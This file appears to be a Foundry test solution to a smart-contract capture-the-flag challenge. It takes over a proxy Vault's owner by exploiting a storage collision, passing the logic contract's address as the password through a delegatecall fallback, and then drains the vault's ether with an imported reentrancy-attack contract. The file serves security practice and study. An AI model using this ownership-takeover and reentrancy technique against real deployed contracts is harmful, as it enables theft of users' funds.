// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/ReentrancyAttack.sol";

contract VaultTest is Test {
    Vault public vault;
    VaultLogic public vaultLogic;
    ReentrancyAttack public attacker;
    address public owner;
    address public attackerAddress;

    bytes32 public password = keccak256(abi.encodePacked("my_secret_password"));

    function setUp() public {
        owner = address(1);
        attackerAddress = address(0xBEEF);

        // 部署 VaultLogic 合约
        vaultLogic = new VaultLogic(password);

        // 部署 Vault 合约
        vault = new Vault(address(vaultLogic));

        // 部署 ReentrancyAttack 合约
        vm.startPrank(attackerAddress);
        attacker = new ReentrancyAttack(payable(address(vault)));
        vm.stopPrank();

        // 初始存款到 Vault 合约
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        vault.deposite{value: 10 ether}();
    }

    function testProxyChangeOwner() public {
        // 准备调用数据
        bytes32 passwordBytes = bytes32(uint256(uint160(address(vaultLogic))));
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", passwordBytes, address(attacker));

        // 通过 fallback() 代理调用 changeOwner 函数
        (bool success, ) = address(vault).call(data);
        require(success, "Proxy change owner failed");

        // 检查 VaultLogic 的所有者是否被改变
        assertEq(vault.owner(), address(attacker));
    }

    function testReentrancyAttack() public {
        // 准备调用数据
        bytes32 passwordBytes = bytes32(uint256(uint160(address(vaultLogic))));
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", passwordBytes, address(attacker));

        // 通过 fallback() 代理调用 changeOwner 函数
        (bool success, ) = address(vault).call(data);
        require(success, "Proxy change owner failed");

        // 检查 VaultLogic 的所有者是否被改变
        assertEq(vault.owner(), address(attacker));

        // 执行攻击
        vm.deal(attackerAddress, 2 ether);

        attacker.attack{value: 1 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();

        // 检查 Vault 合约的最终余额
        uint finalVaultBalance = address(vault).balance;
        assertEq(finalVaultBalance, 0 ether);
    }
}
